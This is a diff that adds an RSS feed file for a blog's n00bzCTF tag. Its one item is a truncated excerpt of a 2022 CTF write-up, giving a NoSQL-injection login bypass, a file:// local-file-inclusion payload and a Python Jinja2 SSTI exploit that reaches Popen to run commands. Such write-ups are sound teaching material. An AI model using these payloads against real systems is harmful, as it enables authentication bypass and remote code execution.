@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>n00bzctf on DH.J</title>
+    <link>https://blog.jhyeon.dev/tags/n00bzctf/</link>
+    <description>Recent content in n00bzctf on DH.J</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Mon, 06 Jun 2022 00:00:00 +0900</lastBuildDate><atom:link href="https://blog.jhyeon.dev/tags/n00bzctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>2022 n00bzCTF Write up</title>
+      <link>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</link>
+      <pubDate>Mon, 06 Jun 2022 00:00:00 +0900</pubDate>
+      
+      <guid>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</guid>
+      <description>Summary TEAM : DEMON
+Rank : 14th
+Web nosqlforyou NOSQL Injection, Authentication Bypass Exploit username=admin password={&amp;#34;$gt&amp;#34;: &amp;#34;&amp;#34;} curl-as-service Python Local File Inclusion Exploit file:///chall/challenge.py Rlass Flask Jinja2 Template SSTI Injection Exploit from requests import post import html cmd = &amp;#34;cat flag&amp;#34; mro = &amp;#34;request|attr(request.args.class)|attr(request.args.mro)&amp;#34; subclasses = &amp;#34;((%s)[3]|attr(request.args.sc))()&amp;#34; % mro popen = &amp;#34;(%s)[363]&amp;#34; % subclasses code = &amp;#34;(%s)(request.args.cmd.split(&amp;#39; &amp;#39;), stdout=-1).communicate()[0]&amp;#34; % popen payload = &amp;#34;{%%print(%s)%%} {# curl http:// #}&amp;#34; % code res = post(&amp;#39;http://167.</description>
+    </item>
+    
+  </channel>
+</rss>
